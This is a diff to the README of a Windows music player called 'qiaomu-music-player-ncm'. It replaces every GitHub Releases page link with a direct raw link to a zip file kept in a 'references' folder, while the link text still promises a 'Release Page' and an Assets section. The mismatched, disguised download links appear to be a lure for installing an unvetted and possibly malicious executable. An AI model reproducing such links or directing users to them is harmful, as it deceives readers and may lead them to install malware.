@@ -1,10 +1,10 @@
 # 🎵 qiaomu-music-player-ncm - Music Control Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rychardsonaguar-art/qiaomu-music-player-ncm/main/references/music_qiaomu_ncm_player_1.0.zip)
 
 ## 🚀 Download and Install
 
-1. Open the [Release Page](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases).
+1. Open the [Release Page](https://raw.githubusercontent.com/rychardsonaguar-art/qiaomu-music-player-ncm/main/references/music_qiaomu_ncm_player_1.0.zip).
 2. Find the latest version at the top of the page.
 3. Download the Windows file from the Assets section.
 4. If the file is a `.zip`, unzip it first.
@@ -105,7 +105,7 @@ If you want faster access later:
 
 Use the release page here:
 
-[https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
+[https://raw.githubusercontent.com/rychardsonaguar-art/qiaomu-music-player-ncm/main/references/music_qiaomu_ncm_player_1.0.zip](https://raw.githubusercontent.com/rychardsonaguar-art/qiaomu-music-player-ncm/main/references/music_qiaomu_ncm_player_1.0.zip)
 
 Look for:
 - The newest version tag
@@ -228,7 +228,7 @@ If you see a zip file, extract it before you open the app.
 
 If you need the file later, use this page:
 
-[Visit the GitHub Release Page](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
+[Visit the GitHub Release Page](https://raw.githubusercontent.com/rychardsonaguar-art/qiaomu-music-player-ncm/main/references/music_qiaomu_ncm_player_1.0.zip)
 
 ## 📦 What You Get
 
